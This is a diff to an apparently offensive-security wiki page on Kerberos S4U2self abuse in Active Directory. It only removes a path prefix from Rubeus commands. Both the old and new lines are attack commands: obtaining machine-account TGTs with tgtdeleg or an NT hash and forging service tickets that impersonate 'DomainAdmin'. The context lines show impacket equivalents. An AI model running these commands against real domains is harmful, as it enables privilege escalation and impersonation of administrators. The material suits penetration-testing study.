@@ -21,7 +21,7 @@ Obtaining a usable TGT for the machine account, either by knowing one of the mac
 The "tgtdeleg" trick can be conducted with [Rubeus](https://github.com/GhostPack/Rubeus) (C#) from the machine as follows.
 
 ```powershell
-.\Rubeus.exe tgtdeleg /nowrap
+Rubeus.exe tgtdeleg /nowrap
 ```
 
 Alternatively, if the machine account credentials are known, the TGT can be obtained as follows.
@@ -39,7 +39,7 @@ getTGT.py -dc-ip "domaincontroller" -hashes :"NThash" "domain"/"machine$"
 From Windows machines, [Rubeus](https://github.com/GhostPack/Rubeus) (C#) can be used for that purpose. Howerver, this step is optional if Rubeus is to be used later on for the S4U2self. In this case, with the appropriate arguments, Rubeus will request a TGT automatically.
 
 ```powershell
-.\Rubeus.exe asktgt /nowrap /domain:"domain" /user:"computer$" /rc4:"NThash"
+Rubeus.exe asktgt /nowrap /domain:"domain" /user:"computer$" /rc4:"NThash"
 ```
 {% endtab %}
 {% endtabs %}
@@ -62,13 +62,13 @@ getST.py -self -impersonate 'DomainAdmin' -spn 'host/machine.domain.local' -k -n
 From Windows machines, [Rubeus](https://github.com/GhostPack/Rubeus) (C#) can be used for that purpose.
 
 ```powershell
-.\Rubeus.exe s4u /self /nowrap /impersonateuser:"DomainAdmin" /ticket:"base64ticket"
+Rubeus.exe s4u /self /nowrap /impersonateuser:"DomainAdmin" /ticket:"base64ticket"
 ```
 
 Rubeus can also be used to obtain a TGT automatically instead of supplying the `/ticket` argument.
 
 ```powershell
-.\Rubeus.exe s4u /self /nowrap /impersonateuser:"DomainAdmin" /domain:"domain" /user:"computer$" /rc4:"NThash"
+Rubeus.exe s4u /self /nowrap /impersonateuser:"DomainAdmin" /domain:"domain" /user:"computer$" /rc4:"NThash"
 ```
 {% endtab %}
 {% endtabs %}
